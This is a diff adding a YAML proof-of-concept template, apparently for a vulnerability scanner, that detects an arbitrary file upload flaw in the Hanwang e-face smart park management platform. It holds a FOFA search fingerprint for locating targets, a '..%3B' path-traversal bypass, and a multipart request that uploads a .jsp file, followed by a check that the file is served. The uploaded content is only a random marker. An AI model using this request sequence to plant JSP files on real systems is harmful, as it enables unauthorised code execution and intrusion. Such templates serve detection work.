@@ -1,0 +1,33 @@
+id: poc-yaml-hw-e-face-pass-spmp-uploadblacklistfile-do-anyfile-upload
+info:
+  name: 汉王e脸通智慧园区管理平台 uploadBlackListFile.do 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: e脸通智慧园区管理平台
+  fofa: icon_hash="1380907357"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /manage/mobiVisit/..%3B/systemBlackList/uploadBlackListFile.do
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+    Content-Type: image/jpeg
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: status_code == 200  && contains(body,"\"success\":true")
+  output:
+  - regex_match(body,"resource/(?P<file>.*?).jsp")
+- method: GET
+  path: /manage/resource/{{.file}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
